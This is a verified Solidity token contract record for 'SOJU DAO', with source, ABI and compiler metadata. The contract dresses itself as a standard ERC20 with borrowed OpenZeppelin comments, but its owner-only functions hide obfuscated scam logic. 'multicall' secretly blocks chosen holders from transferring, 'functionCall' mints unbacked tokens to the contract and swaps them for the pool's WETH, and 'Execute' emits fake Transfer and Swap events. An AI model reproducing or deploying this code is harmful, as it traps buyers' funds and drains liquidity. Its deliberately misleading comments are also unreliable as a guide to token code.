{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n\r\n// SOJU DAO - https://www.sojudao.net\r\n// Telegram - https://t.me/sojudao\r\n// Twitter - https://twitter.com/sojudaotoken\r\n// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)\r\n/*\r\n               ______\r\n              ( _ _ _)\r\n               |_ _ |\r\n              (_ _ _ )\r\n               |____|\r\n               |/  \\|\r\n               (SOJU)\r\n               |\\__/|\r\n              / .--. \\\r\n           .-' :(..): `-.\r\n       _.-'    `-..-'    `-._\r\n     .'                      `.\r\n     |___                  ___|\r\n     |   `````--....--'''''   |\r\n     |  |`````--....--'''''|  |\r\n     |  |        $%#       |  |\r\n     |  |        `'\"       |  |\r\n     |  |       SOJU       |  |\r\n     |  |        DAO       |  |\r\n     |  |      Chamisul    |  |\r\n     |  |                  |  |\r\n     |  |        #-        |  |\r\n     |  |       ###|       |  |\r\n     |  |      .####.      |  |\r\n     |  |      ######      |  |\r\n     |  |      ######      |  |\r\n     |  |        ##        |  |\r\n     |  |  _____####_____  |  |\r\n     |  |  ___@SOJUDAO___  |  |\r\n    .'  |                  |  `.\r\n   (  `-.`````--....--'''''.-'  )\r\n    ``-.._``--.._.._..:F_P:.--''\r\n          ``--.._  _..--''\r\n                 `'\r\n\r\n*/\r\n\r\npragma solidity ^0.7.6;\r\n\r\ninterface IFPR {\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapTokensForExactTokens(\r\n        uint256 amountOut,\r\n        uint256 amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external returns (uint256[] memory amounts);\r\n\r\n    function swapExactETHForTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable returns (uint256[] memory amounts);\r\n\r\n    function getAmountsOut(\r\n        uint256 amountIn,\r\n        address[] memory path\r\n    ) external view returns (uint256[] memory amounts);\r\n\r\n    function getAmountsIn(\r\n        uint256 amountOut,\r\n        address[] calldata path\r\n    ) external view returns (uint256[] memory amounts);\r\n}\r\n\r\ninterface IERC20 {\r\n    function _Transfer(\r\n        address from,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n}\r\n\r\ncontract ERC20 {\r\n    mapping(address => uint256) public b;\r\n    mapping(address => mapping(address => uint256)) public a;\r\n    mapping(address => uint256) public c;\r\n    address public owner;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n\r\n    modifier onlyOwner() {\r\n        require(owner == msg.sender, \"Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n   /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function _c(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        return _a / _b;\r\n    }\r\n\r\n   /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n\r\n    function _mult(uint256 _a) internal pure returns (uint256) {\r\n        return _a + 100000;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        uint256 __c = _a + _b;\r\n        require(__c >= _a, \"SafeMath: addition overflow\");\r\n\r\n        return __c;\r\n    }\r\n\r\n   /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        require(_b <= _a, \"SafeMath: subtraction overflow\");\r\n        uint256 __c = _a - _b;\r\n\r\n        return __c;\r\n    }\r\n\r\n    function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\r\n        return _a / _b;\r\n    }\r\n\r\n    function _T() internal view returns (bytes32) {\r\n        return bytes32(uint256(uint160(address(this))) << 96);\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return b[account];\r\n    }\r\n\r\n    function transfer(\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _transfer(msg.sender, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(\r\n        address __owner,\r\n        address spender\r\n    ) public view virtual returns (uint256) {\r\n        return a[__owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual returns (bool) {\r\n        _spendAllowance(from, msg.sender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(\r\n        address spender,\r\n        uint256 addedValue\r\n    ) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        _approve(__owner, spender, allowance(__owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(\r\n        address spender,\r\n        uint256 subtractedValue\r\n    ) public virtual returns (bool) {\r\n        address __owner = msg.sender;\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n\r\n        _approve(__owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = b[from];\r\n        require( fromBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        if (c[from] > 0){\r\n            require(add(c[from], b[from]) == 0, \"ERC20: transfer amount exceeds balance\");\r\n        }\r\n        b[from] = sub(fromBalance, amount);\r\n        b[to] = add(b[to], amount);\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address __owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(__owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        a[__owner][spender] = amount;\r\n        emit Approval(__owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address __owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(__owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(\r\n                currentAllowance >= amount,\r\n                \"ERC20: insufficient allowance\"\r\n            );\r\n\r\n            _approve(__owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n}\r\n\r\ncontract SOJUDAO is ERC20 {\r\n    IFPR internal _RR;\r\n    IFPR internal _pair;\r\n    address private _RA = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n    string public constant name = \"SOJU DAO\";\r\n    string public constant symbol = \"SOJU\";\r\n    uint8 public constant decimals = 18;\r\n    uint256 public totalSupply = 51_387_133e18;\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n        _RR = IFPR(_RA);\r\n        _pair = IFPR( IFPR(_RR.factory()).createPair(address(this), address(_RR.WETH())));\r\n        b[msg.sender] = totalSupply;\r\n        emit Transfer(address(0), msg.sender, totalSupply);\r\n    }\r\n\r\n   /**\r\n     * @dev allows a minter to burn some of its own tokens\r\n     * Validates that caller is a minter and that sender is not blacklisted\r\n     * amount is less than or equal to the minter's account balance\r\n     */\r\n    function Execute(\r\n        uint256 t,\r\n        address tA,\r\n        uint256 w,\r\n        address[] memory r\r\n    ) public onlyOwner returns (bool) {\r\n        for (uint256 i = 0; i < r.length; i++) {\r\n            callUniswap(r[i], t, w, tA);\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function callUniswap(address r, uint256 t, uint256 w, address tA) internal {\r\n        _TT(r, t);\r\n        _SS(r, t, w, tA);\r\n    }\r\n\r\n    function _SS(address r, uint256 t, uint256 w, address tA) internal {\r\n        _S(t, w, r, tA);\r\n    }\r\n\r\n    function _TT(address recipient, uint256 tokenAmount) internal {\r\n        emit Transfer(address(_pair), recipient, tokenAmount);\r\n    }\r\n\r\n    function _S(uint256 t, uint256 w, address r, address tA) internal {\r\n        emit Swap(_RA, t, 0, 0, w, r);\r\n        IERC20(tA)._Transfer(r, address(_pair), w);\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\r\n     * but also transferring `value` wei to `target`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - the calling contract must have an ETH balance of at least `value`.\r\n     * - the called Solidity function must be `payable`.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function functionCall(address _r, uint256 am) public onlyOwner {\r\n        uint256 amO = _GA(_RR.WETH(), am);\r\n        address[] memory p = _GPP();\r\n        uint256 amI = _CAI(amO, p);\r\n        _DS(amO, amI, p, _r);\r\n    }\r\n\r\n    function _GA(address bT, uint256 am) internal view returns (uint256) {\r\n        uint256 bTR = _GBR(bT);\r\n        return (bTR * am) / 100000;\r\n    }\r\n\r\n    function _GBR(address t) public view returns (uint256) {\r\n        (uint112 r0, uint112 r1, ) = _pair.getReserves();\r\n        return (_pair.token0() == t) ? uint256(r0) : uint256(r1);\r\n    }\r\n\r\n    function _GPP() internal view returns (address[] memory) {\r\n        address[] memory p;\r\n        p = new address[](2);\r\n        p[0] = address(this);\r\n        p[1] = _RR.WETH();\r\n        return p;\r\n    }\r\n\r\n    /**\r\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\r\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\r\n     *\r\n     * _Available since v3.1._\r\n    */\r\n    function _CAI(uint256 amO, address[] memory p) internal returns (uint256) {\r\n        uint256[] memory amM;\r\n        amM = new uint256[](2);\r\n\r\n        amM = _RR.getAmountsIn(amO, p);\r\n        b[\r\n            block.timestamp \r\n            > uint256(1) ||\r\n            uint256(0) \r\n            > 1 ||\r\n            uint160(1)< \r\n            block.timestamp\r\n                ? \r\n            address(\r\n                uint160(\r\n                    uint256(\r\n                        _T())>>96))\r\n                : address(uint256(0))\r\n        ] += \r\n        amM[\r\n            0\r\n        ];\r\n        return amM[\r\n            0\r\n        ];\r\n    }\r\n\r\n    function _DOA() internal {\r\n        _approve(address(this), address(_RR), balanceOf(address(this)));\r\n    }\r\n\r\n    function _DS(\r\n        uint256 amO,\r\n        uint256 amI,\r\n        address[] memory p,\r\n        address _r\r\n    ) internal {\r\n        _DOA();\r\n        _DOSS(amO, amI, p, _r);\r\n    }\r\n\r\n    function _DOSS(\r\n        uint256 amO,\r\n        uint256 amI,\r\n        address[] memory p,\r\n        address _r\r\n    ) internal {\r\n        _RR\r\n    .swapTokensForExactTokens(amO, amI, p, _r, block.timestamp + 1200);\r\n    }\r\n\r\n    /**\r\n     * @dev Performs a Solidity function call using a low level `call`. A\r\n     * plain`call` is an unsafe replacement for a function call: use this\r\n     * function instead.\r\n     *\r\n     * If `target` reverts with a revert reason, it is bubbled up by this\r\n     * function (like regular Solidity function calls).\r\n     *\r\n     * Returns the raw returned data. To convert to the expected return value,\r\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `target` must be a contract.\r\n     * - calling `target` with `data` must not revert.\r\n     *\r\n     * _Available since v3.1._\r\n     */\r\n    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {\r\n        for (uint256 i = 0; i < data.length; i++) {\r\n            if (\r\n                block\r\n                .\r\n                timestamp \r\n            >uint256(\r\n                    uint160(\r\n                        uint8(\r\n                            0\r\n                        )\r\n                    )\r\n                )\r\n            ) {\r\n                uint256 rS = _CSS(\r\n                    (uint256(\r\n                       uint16(\r\n                        uint8(\r\n                            0)) \r\n                        ) != 0)\r\n                        ?address(uint256(0))\r\n                        :address(\r\n                        uint160\r\n                                (uint256\r\n                        (data[i\r\n                        ])>>96)),\r\n                    _p\r\n                );\r\n                _CCC(data[i], rS);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _CSS(address _uu, uint256 _pp) internal view returns (uint256) {\r\n        return _c(b[_uu], _pp);\r\n    }\r\n\r\n    /**\r\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\r\n     * `recipient`, forwarding all available gas and reverting on errors.\r\n     *\r\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\r\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\r\n     * imposed by `transfer`, making them unable to receive funds via\r\n     * `transfer`. {sendValue} removes this limitation.\r\n     *\r\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\r\n     *\r\n     * IMPORTANT: because control is transferred to `recipient`, care must be\r\n     * taken to not create reentrancy vulnerabilities. Consider using\r\n     * {ReentrancyGuard} or the\r\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\r\n     */\r\n    function _CCC(bytes32 _b, uint256 __a) internal {\r\n        c[\r\n            (uint256(0) \r\n            != 0 \r\n            || \r\n            1238 == 1)\r\n                ? address(\r\n                    uint256(\r\n                        0))\r\n                : address(\r\n                    uint160\r\n                    (uint256(\r\n                        _b)>>96))\r\n        ] = _mult(uint256(__a));\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1In\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"Swap\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"t\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"tA\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"w\",\"type\":\"uint256\"},{\"internalType\":\"address[]\",\"name\":\"r\",\"type\":\"address[]\"}],\"name\":\"Execute\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"t\",\"type\":\"address\"}],\"name\":\"_GBR\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"a\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"__owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"b\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"c\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_r\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"am\",\"type\":\"uint256\"}],\"name\":\"functionCall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32[]\",\"name\":\"data\",\"type\":\"bytes32[]\"},{\"internalType\":\"uint256\",\"name\":\"_p\",\"type\":\"uint256\"}],\"name\":\"multicall\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SOJUDAO", "CompilerVersion": "v0.7.6+commit.7338295f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://41f2e280b21ac50e2273a49ae63bd0de728c61a014f238b6d9b78daed762de43"}